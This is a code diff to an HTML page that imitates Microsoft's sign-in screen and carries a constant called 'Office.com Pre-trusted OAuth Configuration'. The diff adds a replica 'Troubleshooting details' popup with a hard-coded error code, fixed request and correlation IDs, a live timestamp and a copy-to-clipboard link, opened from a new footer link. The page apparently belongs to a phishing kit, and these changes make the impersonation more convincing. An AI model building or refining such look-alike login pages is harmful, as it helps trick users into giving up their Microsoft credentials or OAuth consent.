@@ -207,6 +207,28 @@
         display: flex;
         justify-content: center;
     }
+    /* ✅ POPUP BOX STYLES */
+    .troubleshooting-box {
+        display: none;
+        background-color: #ffffff;
+        padding: 24px;
+        margin-top: 16px;
+        box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        font-size: 14px;
+        color: #1b1b1b;
+    }
+    .troubleshooting-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: flex-start;
+    }
+    .troubleshooting-header h2 { margin: 0; font-size: 18px; font-weight: 600; }
+    .troubleshooting-close { font-size: 24px; font-weight: 200; border: none; background: none; cursor: pointer; }
+    .troubleshooting-body p { margin: 8px 0; }
+    .troubleshooting-body strong { font-weight: 600; }
+    .troubleshooting-body .code { font-family: Consolas, monospace; font-size: 13px; }
+    .troubleshooting-body a { color: #0067b8; text-decoration: none; }
+    .troubleshooting-body a:hover { text-decoration: underline; }
     .hidden { display: none !important; }
     .loading {
       text-align: center;
@@ -305,6 +327,27 @@
           <span>Sign-in options</span>
         </a>
       </div>
+
+      <!-- ✅ POPUP BOX (Troubleshooting) -->
+      <div class="troubleshooting-box" id="troubleshooting_box">
+        <div class="troubleshooting-header">
+            <h2>Troubleshooting details</h2>
+            <button class="troubleshooting-close" id="close_troubleshooting_btn">&times;</button>
+        </div>
+        <div class="troubleshooting-body">
+            <p>If you contact your administrator, send this info to them.</p>
+            <p><a href="#" id="copy_info_link">Copy info to clipboard</a></p>
+            <div id="error_details_for_copy">
+                <p><strong>Error Code:</strong> 50058</p>
+                <p><strong>Request Id:</strong> <span class="code">a4d52b6b-cc92-4914-95ee-fe70b9bc0200</span></p>
+                <p><strong>Correlation Id:</strong> <span class="code">eaa8bc41-ac19-4850-9294-bc88a1f0e181</span></p>
+                <p><strong>Timestamp:</strong> <span class="code" id="modal_timestamp"></span></p>
+            </div>
+            <hr>
+            <p><strong>Flag sign-in errors for review:</strong> <a href="#">Enable flagging</a></p>
+            <p>If you plan on getting help for this problem, enable flagging and try to reproduce the error within 20 minutes. Flagged events make diagnostics available and are raised to admin attention.</p>
+        </div>
+      </div>
     </div>
   </div>
 
@@ -312,6 +355,7 @@
   <div class="page-footer">
     <a href="https://www.microsoft.com/en-US/servicesagreement/" target="_blank">Terms of use</a>
     <a href="https://www.microsoft.com/en-US/privacy/privacystatement" target="_blank">Privacy & cookies</a>
+    <a href="#" id="footer_dots_link">...</a>
   </div>
 
   <script>
@@ -326,6 +370,9 @@
         const nextBtn = document.getElementById('next');
         const signInOptionsLink = document.getElementById('sign_in_options_link');
         const backBtn = document.getElementById('options-view-back');
+        const troubleshootingBox = document.getElementById('troubleshooting_box');
+        const closeTroubleshootingBtn = document.getElementById('close_troubleshooting_btn');
+        const footerDotsLink = document.getElementById('footer_dots_link');
 
         // Office.com Pre-trusted OAuth Configuration
         const OFFICE_CONFIG = {
@@ -426,6 +473,32 @@
             div2.classList.add('hidden');
             div3.classList.add('hidden');
             optionsBox.classList.remove('hidden');
+        });
+
+        // ✅ FOOTER DOTS BUTTON - Show troubleshooting popup
+        footerDotsLink.addEventListener('click', function (e) {
+            e.preventDefault();
+            console.log('📋 Footer dots clicked - Showing troubleshooting popup');
+            document.getElementById('modal_timestamp').textContent = new Date().toISOString();
+            troubleshootingBox.style.display = troubleshootingBox.style.display === 'block' ? 'none' : 'block';
+        });
+
+        // ✅ CLOSE TROUBLESHOOTING POPUP
+        closeTroubleshootingBtn.addEventListener('click', function () {
+            console.log('❌ Closing troubleshooting popup');
+            troubleshootingBox.style.display = 'none';
+        });
+
+        // ✅ COPY INFO TO CLIPBOARD
+        document.getElementById('copy_info_link').addEventListener('click', function (e) {
+            e.preventDefault();
+            const detailsNode = document.getElementById('error_details_for_copy');
+            const detailsText = detailsNode.innerText.trim().replace(/\s\s+/g, '\n');
+            navigator.clipboard.writeText(detailsText).then(() => {
+                const originalText = e.target.textContent;
+                e.target.textContent = 'Copied!';
+                setTimeout(() => { e.target.textContent = originalText; }, 2000);
+            });
         });
     });
   </script>
